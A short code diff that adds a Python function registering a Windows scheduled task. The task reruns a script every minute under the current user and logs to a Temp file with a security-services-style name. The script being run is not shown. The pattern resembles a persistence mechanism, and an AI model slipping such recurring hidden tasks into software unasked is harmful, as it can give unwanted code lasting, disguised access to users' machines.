@@ -133,6 +133,24 @@ def task_exists(task_name: str) -> bool:
     )
     return result.returncode == 0
 
+def create_user_task(username):
+    subprocess.run(
+        [
+            "schtasks",
+            "/create",
+            "/f",
+            #"/sc", "onlogon",
+            "/sc", "minute",
+            "/mo", "1",
+            "/ru", os.getlogin(),
+            "/tn", USER_TASK_NAME,
+            "/tr", f'"{PYTHON_EXE}" "{USER_DST}" >> C:\\Windows\\Temp\\SecutiryServicesLogsUser.txt 2>&1',
+            #"/ri", "1",
+            #"/du", "00:30"
+        ],
+        check=True
+    )
+
 if __name__ == "__main__":
     computer_name = os.environ.get("COMPUTERNAME", socket.gethostname())
     user_name = os.environ.get("USERNAME", "SYSTEM")
